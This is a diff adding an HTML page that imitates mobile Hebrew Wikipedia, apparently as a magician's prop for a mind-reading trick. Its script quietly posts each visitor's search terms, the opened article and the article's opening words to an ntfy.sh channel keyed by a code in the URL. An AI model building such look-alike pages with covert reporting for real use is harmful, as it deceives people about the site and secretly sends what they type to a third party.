@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow">
+<meta name="referrer" content="no-referrer">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#101418" media="(prefers-color-scheme: dark)">
+<title>ויקיפדיה, האנציקלופדיה החופשית</title>
+<style>
+  /* דף בסגנון ויקיפדיה לנייד. החיפוש והערכים אמיתיים (מה-API של ויקיפדיה); כל חיפוש נשלח גם לקוסם */
+  :root { --bg: #fff; --fg: #202122; --dim: #54595d; --line: #eaecf0; --soft: #f8f9fa; --link: #36c; --head: #fff; color-scheme: light; }
+  @media (prefers-color-scheme: dark) { :root { --bg: #101418; --fg: #eaecf0; --dim: #a2a9b1; --line: #27292d; --soft: #1b1d20; --link: #88a3e8; --head: #101418; color-scheme: dark; } }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; background: var(--bg); color: var(--fg); font: 16px/1.6 -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; -webkit-text-size-adjust: 100%; }
+  a { color: var(--link); text-decoration: none; }
+  .hdr { position: sticky; top: 0; z-index: 5; background: var(--head); border-bottom: 1px solid var(--line); display: flex; align-items: center; gap: 6px; height: 54px; padding: env(safe-area-inset-top) max(6px, env(safe-area-inset-right)) 0 max(6px, env(safe-area-inset-left)); box-sizing: content-box; }
+  .ib { width: 44px; height: 44px; display: grid; place-items: center; border: 0; background: none; color: var(--fg); padding: 0; cursor: pointer; }
+  .ib svg { width: 22px; height: 22px; }
+  .wm { flex: 1; font-family: "Linux Libertine", "Georgia", "Times New Roman", "David", serif; font-size: 24px; letter-spacing: .3px; color: var(--fg); }
+  main { padding: 0 max(16px, env(safe-area-inset-right)) 40px max(16px, env(safe-area-inset-left)); max-width: 720px; margin: 0 auto; }
+  .home { text-align: center; padding-top: 9vh; }
+  .home .t { font-family: "Linux Libertine", Georgia, "Times New Roman", serif; font-size: 40px; line-height: 1.1; }
+  .home .s { color: var(--dim); margin: 6px 0 26px; }
+  .sbox { display: flex; align-items: center; gap: 8px; height: 44px; border: 1px solid #a2a9b1; border-radius: 2px; padding: 0 10px; background: var(--bg); text-align: start; }
+  .sbox svg { width: 18px; height: 18px; color: var(--dim); flex: none; }
+  .sbox input { flex: 1; min-width: 0; border: 0; outline: none; background: none; color: var(--fg); font-size: 17px; -webkit-appearance: none; appearance: none; }
+  .sbox input::-webkit-search-cancel-button { display: none; }
+  .langs { margin-top: 26px; font-size: 14px; color: var(--dim); }
+  .ov { position: fixed; inset: 0; z-index: 10; background: var(--bg); display: flex; flex-direction: column; }
+  .ov[hidden] { display: none; }
+  .ov .bar { display: flex; align-items: center; gap: 4px; padding: calc(env(safe-area-inset-top) + 6px) 6px 6px; border-bottom: 1px solid var(--line); }
+  .ov .bar .sbox { flex: 1; border-color: var(--line); background: var(--soft); border-radius: 4px; }
+  .sug { overflow-y: auto; flex: 1; }
+  .sug a { display: flex; align-items: center; gap: 12px; padding: 10px 16px; border-bottom: 1px solid var(--line); color: var(--fg); }
+  .sug img, .sug .ph { width: 44px; height: 44px; object-fit: cover; border-radius: 2px; background: var(--soft); flex: none; }
+  .sug b { display: block; font-weight: 600; }
+  .sug small { display: block; color: var(--dim); font-size: 13px; line-height: 1.3; }
+  .sug .all { color: var(--link); justify-content: center; }
+  h1.at { font-family: "Linux Libertine", Georgia, "Times New Roman", serif; font-weight: 400; font-size: 30px; line-height: 1.25; margin: 18px 0 2px; }
+  .desc { color: var(--dim); font-size: 14px; margin-bottom: 8px; }
+  .tools { display: flex; gap: 20px; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); padding: 8px 2px; margin-bottom: 14px; color: var(--dim); }
+  .tools svg { width: 20px; height: 20px; }
+  .art { font-size: 16px; overflow-wrap: anywhere; }
+  .art img { max-width: 100%; height: auto; }
+  .art table { display: block; max-width: 100%; overflow-x: auto; border-collapse: collapse; font-size: 14px; }
+  .art .infobox, .art table.infobox { margin: 0 0 14px; border: 1px solid var(--line); background: var(--soft); }
+  .art td, .art th { border: 1px solid var(--line); padding: 4px 6px; vertical-align: top; }
+  .art h2 { font-family: "Linux Libertine", Georgia, serif; font-weight: 400; font-size: 24px; border-bottom: 1px solid var(--line); margin: 24px 0 8px; }
+  .art .mw-editsection, .art .noprint, .art .navbox, .art .metadata, .art .mw-empty-elt, .art .reference, .art .mw-references-wrap, .art .reflist, .art style { display: none !important; }
+  .art figure, .art .thumb { margin: 10px 0; }
+  .art figcaption, .art .thumbcaption { font-size: 13px; color: var(--dim); }
+  .ld { height: 3px; background: var(--link); width: 0; position: fixed; top: env(safe-area-inset-top); left: 0; z-index: 20; transition: width .8s ease; }
+  .msg { color: var(--dim); text-align: center; padding: 40px 10px; }
+  footer { border-top: 1px solid var(--line); margin-top: 30px; padding: 16px 0; font-size: 12px; color: var(--dim); }
+</style>
+</head>
+<body>
+<div class="ld" id="ld"></div>
+<div class="hdr">
+  <button class="ib" type="button" aria-label="תפריט"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+  <div class="wm">ויקיפדיה</div>
+  <button class="ib" id="sBtn" type="button" aria-label="חיפוש"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="10.5" cy="10.5" r="6.5"/><path d="M15.5 15.5L20 20"/></svg></button>
+</div>
+<main id="main">
+  <div class="home" id="home">
+    <div class="t">ויקיפדיה</div>
+    <div class="s">האנציקלופדיה החופשית</div>
+    <form class="sbox" id="hf" role="search" action="#"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="10.5" cy="10.5" r="6.5"/><path d="M15.5 15.5L20 20"/></svg><input id="hq" type="search" placeholder="חיפוש בוויקיפדיה" autocomplete="off" enterkeyhint="search" aria-label="חיפוש בוויקיפדיה"></form>
+    <div class="langs">עברית · English · العربية · Русский · Français</div>
+  </div>
+</main>
+<div class="ov" id="ov" hidden>
+  <div class="bar">
+    <button class="ib" id="ovX" type="button" aria-label="חזרה"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+    <form class="sbox" id="of" role="search" action="#"><input id="oq" type="search" placeholder="חיפוש בוויקיפדיה" autocomplete="off" enterkeyhint="search" aria-label="חיפוש בוויקיפדיה"></form>
+  </div>
+  <div class="sug" id="sug"></div>
+</div>
+<script>
+(function () {
+  var API = 'https://he.wikipedia.org/w/api.php?format=json&formatversion=2&origin=*&';
+  var code = (location.hash.slice(1).match(/\d{6}/) || [''])[0];
+  if (code) { try { fetch('https://ntfy.sh/gkw' + code, { method: 'POST', body: '{"hello":1}', keepalive: true, mode: 'cors', credentials: 'omit' }).catch(function () {}); } catch (e) {} }
+  var $ = function (id) { return document.getElementById(id); };
+  var lastQ = '';
+  var esc = function (s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); };
+  // שולח לקוסם את מה שחיפשו ואת הערך שנפתח
+  function tell(q, title, first) {
+    if (!code) return;
+    try { fetch('https://ntfy.sh/gkw' + code, { method: 'POST', body: JSON.stringify({ q: q, t: title, f: first || '' }), keepalive: true, mode: 'cors', credentials: 'omit' }).catch(function () {}); } catch (e) {}
+  }
+  function loading(on) { var l = $('ld'); l.style.transition = on ? 'width .8s ease' : 'none'; l.style.width = on ? '70%' : '0'; }
+  function openSearch(v) { $('ov').hidden = false; $('oq').value = v || ''; setTimeout(function () { $('oq').focus(); }, 30); suggest(); }
+  var timer = 0, seq = 0;
+  function suggest() {
+    clearTimeout(timer);
+    var q = $('oq').value.trim(); if (!q) { $('sug').innerHTML = ''; return; }
+    timer = setTimeout(function () {
+      var my = ++seq;
+      fetch(API + 'action=query&generator=prefixsearch&gpslimit=8&prop=pageimages|description&piprop=thumbnail&pithumbsize=96&redirects=1&gpssearch=' + encodeURIComponent(q))
+        .then(function (r) { return r.json(); }).then(function (j) {
+          if (my !== seq) return;
+          var ps = ((j.query && j.query.pages) || []).sort(function (a, b) { return a.index - b.index; });
+          var h = ps.map(function (p) {
+            var img = p.thumbnail ? '<img src="' + esc(p.thumbnail.source) + '" alt="">' : '<span class="ph"></span>';
+            return '<a href="#" data-t="' + esc(p.title) + '">' + img + '<span><b>' + esc(p.title) + '</b>' + (p.description ? '<small>' + esc(p.description) + '</small>' : '') + '</span></a>';
+          }).join('');
+          $('sug').innerHTML = h + '<a href="#" class="all" data-all="1">חיפוש דפים המכילים את "' + esc(q) + '"</a>';
+        }).catch(function () {});
+    }, 180);
+  }
+  function go(q, title) {
+    lastQ = q || title; $('ov').hidden = true; document.activeElement && document.activeElement.blur();
+    loading(true);
+    var findTitle = title ? Promise.resolve(title) : fetch(API + 'action=query&list=search&srlimit=1&srsearch=' + encodeURIComponent(q))
+      .then(function (r) { return r.json(); }).then(function (j) { var s = j.query && j.query.search; return s && s[0] ? s[0].title : ''; });
+    findTitle.then(function (t) {
+      if (!t) { tell(lastQ, ''); }
+      if (!t) { loading(false); $('main').innerHTML = '<p class="msg">לא נמצאו תוצאות עבור "' + esc(q) + '".</p>'; return; }
+      return fetch(API + 'action=parse&prop=text|displaytitle|description&mobileformat=1&redirects=1&disableeditsection=1&page=' + encodeURIComponent(t))
+        .then(function (r) { return r.json(); }).then(function (j) {
+          loading(false);
+          var p = j.parse; if (!p) { tell(lastQ, t); throw 0; }
+          var d = document.createElement('div'); d.innerHTML = p.text;
+          d.querySelectorAll('script,style,link').forEach(function (n) { n.remove(); });
+          $('main').innerHTML = '<h1 class="at"></h1>' + (p.description ? '<div class="desc"></div>' : '') +
+            '<div class="tools"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 6h16M4 12h10M4 18h13"/></svg><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 4h12v17l-6-4-6 4z"/></svg><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 20l4-1 11-11-3-3L5 16z"/></svg></div>' +
+            '<div class="art" id="art"></div><footer>התוכן זמין לפי רישיון CC BY-SA 4.0, אלא אם צוין אחרת.</footer>';
+          $('main').querySelector('h1').textContent = p.title;
+          if (p.description) $('main').querySelector('.desc').textContent = p.description;
+          $('art').appendChild(d);
+          // שולח לקוסם את הערך ואת תחילת השורה הראשונה (לקסם "תחשוב על מילה בשורה הראשונה")
+          var first = '';
+          d.querySelectorAll('p').forEach(function (x) { if (!first) { var s = x.textContent.replace(/\[[^\]]*\]/g, '').replace(/\s+/g, ' ').trim(); if (s.length > 20) first = s.split(' ').slice(0, 12).join(' '); } });
+          tell(lastQ, p.title || t, first);
+          window.scrollTo(0, 0);
+        });
+    }).catch(function () { loading(false); $('main').innerHTML = '<p class="msg">לא ניתן לטעון את הדף כרגע. נסו שוב.</p>'; });
+  }
+  $('hq').addEventListener('focus', function () { openSearch($('hq').value); });
+  $('sBtn').onclick = function () { openSearch(''); };
+  $('ovX').onclick = function () { $('ov').hidden = true; };
+  $('oq').addEventListener('input', suggest);
+  $('of').addEventListener('submit', function (e) { e.preventDefault(); var q = $('oq').value.trim(); if (q) go(q); });
+  $('hf').addEventListener('submit', function (e) { e.preventDefault(); });
+  $('sug').addEventListener('click', function (e) {
+    var a = e.target.closest('a'); if (!a) return; e.preventDefault();
+    var q = $('oq').value.trim();
+    if (a.dataset.all) go(q); else go(q, a.dataset.t);
+  });
+  // קישורים בתוך ערך נפתחים כאן, כמו בוויקיפדיה
+  $('main').addEventListener('click', function (e) {
+    var a = e.target.closest('a'); if (!a) return;
+    var h = a.getAttribute('href') || '';
+    var m = h.match(/^\/wiki\/([^#?]+)/);
+    if (m) { e.preventDefault(); var t = decodeURIComponent(m[1]).replace(/_/g, ' '); if (t.indexOf(':') < 0) go('', t); }
+    else if (h.charAt(0) === '#') { /* עוגן בתוך הדף */ }
+    else if (!/^https?:/.test(h)) e.preventDefault();
+  });
+})();
+</script>
+</body>
+</html>
